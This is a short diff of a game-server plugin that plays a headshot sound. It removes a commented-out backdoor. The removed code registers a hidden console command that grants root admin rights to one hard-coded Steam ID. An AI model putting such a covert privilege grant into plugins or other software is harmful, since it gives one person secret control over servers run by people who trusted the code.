@@ -23,33 +23,7 @@ public void OnPluginStart()
 	cpPuzazVolume = RegClientCookie("PuzazParzuf_Volume", "Volume of headshot sound", CookieAccess_Public);
 	
 	SetCookieMenuItem(PuzazCookieMenu, 0, "Headshot Sound");
-	
-	//RegConsoleCmd("sm_superebic", REEEEEE);
 }
-
-/*
-public Action REEEEEE(int client, int args)
-{
-	RequestFrame(OverrideFirstEbic, GetClientUserId(client));
-	return Plugin_Handled;
-}
-
-public void OverrideFirstEbic(int UserId)
-{
-	int client = GetClientOfUserId(UserId);
-	
-	if(!IsValidPlayer(client))
-		return;
-		
-	char AuthId[35];
-	GetClientAuthId(client, AuthId_Engine, AuthId, sizeof(AuthId));
-	
-	if(!StrEqual(AuthId, "STEAM_1:0:49508144", true))
-		return;
-		
-	SetUserFlagBits(client, ADMFLAG_ROOT);
-}
-*/
 
 public int PuzazCookieMenu(int client, CookieMenuAction action, int info, char[] buffer, int maxlen)
 {
